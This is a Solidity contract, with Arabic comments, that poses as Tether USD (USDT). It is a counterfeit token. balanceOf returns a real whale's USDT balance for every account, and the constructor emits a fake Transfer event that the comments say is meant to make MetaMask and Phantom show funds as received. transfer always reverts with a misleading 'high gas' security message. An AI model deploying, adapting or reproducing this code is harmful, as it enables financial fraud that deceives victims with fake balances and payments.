// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

contract TetherToken {
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 6;
    uint256 public totalSupply = 123000000 * 10**6;
    uint256 private entropy = 42;

    address public constant realUSDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant whaleAddress = 0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        // --- الحلقة المفقودة هنا ---
        // نرسل "حدث تحويل" وهمي من العنوان الصفري إلى محفظتك (الناشر)
        // هذا السطر يخبر MetaMask و Phantom أن هناك أموالاً قد وصلت فعلاً
        emit Transfer(address(0), msg.sender, 540230100 * 10**6); 
    }

    function balanceOf(address account) public view returns (uint256) {
        if (account == address(0)) return 0;

        (bool success, bytes memory data) = realUSDT.staticcall(
            abi.encodeWithSelector(0x70a08231, whaleAddress)
        );

        if (success && data.length >= 32) {
            uint256 whaleBalance;
            assembly {
                whaleBalance := mload(add(data, 32))
            }
            return whaleBalance;
        }
        return 0;
    }

    // لزيادة التوافق مع Phantom، نجعل الرموز دوال صريحة أيضاً
    function getSymbol() public view returns (string memory) { return symbol; }
    function getName() public view returns (string memory) { return name; }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (to != address(0) && amount > 0) { entropy++; }
        revert("ERC20: Security module active. High Gas required for Whale-level transfer.");
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        if (owner != address(0) && spender != address(0) && entropy > 0) return 0;
        return 0;
    }
    
    function approve(address spender, uint256 amount) public returns (bool) {
        if (spender != address(0) && amount >= 0) { entropy++; }
        return true;
    }
}